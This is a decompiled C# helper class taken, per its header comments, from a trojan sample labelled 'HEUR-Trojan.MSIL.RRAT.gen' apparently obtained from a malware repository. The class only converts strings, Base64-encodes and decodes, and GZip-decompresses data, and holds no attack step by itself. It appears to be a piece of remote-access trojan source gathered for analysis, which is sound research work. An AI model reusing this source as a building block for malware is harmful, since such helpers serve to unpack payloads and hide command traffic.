// Decompiled with JetBrains decompiler
// Type: Lime.Helper.StringConverter
// Assembly: ClientX, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6EEC5B2E-8B21-4543-94D2-F5C89EF8D336
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.RRAT.gen-1ff51be88103ec4492613582af80f682292f70f7270ec457c7ca14a89fe324bb.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Text;

namespace Lime.Helper
{
  public static class StringConverter
  {
    public static byte[] StringToBytes(string s) => Encoding.Default.GetBytes(s);

    public static string BytestoString(byte[] b) => Encoding.Default.GetString(b);

    public static byte[] Decompress(byte[] data)
    {
      try
      {
        MemoryStream memoryStream1 = new MemoryStream();
        memoryStream1.Write(data, 0, data.Length);
        memoryStream1.Position = 0L;
        GZipStream gzipStream = new GZipStream((Stream) memoryStream1, CompressionMode.Decompress, true);
        MemoryStream memoryStream2 = new MemoryStream();
        byte[] buffer = new byte[64];
        for (int count = gzipStream.Read(buffer, 0, buffer.Length); count > 0; count = gzipStream.Read(buffer, 0, buffer.Length))
          memoryStream2.Write(buffer, 0, count);
        gzipStream.Close();
        return memoryStream2.ToArray();
      }
      catch
      {
        return (byte[]) null;
      }
    }

    public static string Encode(string str) => Convert.ToBase64String(Encoding.UTF8.GetBytes(str));

    public static string Decode(string str) => Encoding.UTF8.GetString(Convert.FromBase64String(str));
  }
}
